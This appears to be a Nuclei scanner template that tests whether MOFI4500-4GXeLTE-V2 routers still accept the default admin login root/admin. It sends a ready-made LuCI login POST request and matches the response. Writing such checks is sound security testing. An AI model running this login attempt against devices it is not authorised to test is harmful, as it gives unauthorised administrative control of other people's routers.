id: mofi4500-default-login

info:
  name: MOFI4500-4GXeLTE-V2 默认口令登录（弱口令）
  author: pikpikcu
  severity: high
  description: 该模板通过尝试 MOFI4500-4GXeLTE-V2 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://www.cleancss.com/router-default/Mofi_Network/MOFI4500-4GXELTE
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: mofi,default-login,vuln

http:
  - raw:
      - |
        POST /cgi-bin/luci/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=root&password=admin

    attack: pitchfork
    payloads:
      username:
        - root
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "MOFI4500 - General - LuCI"

      - type: status
        status:
          - 200
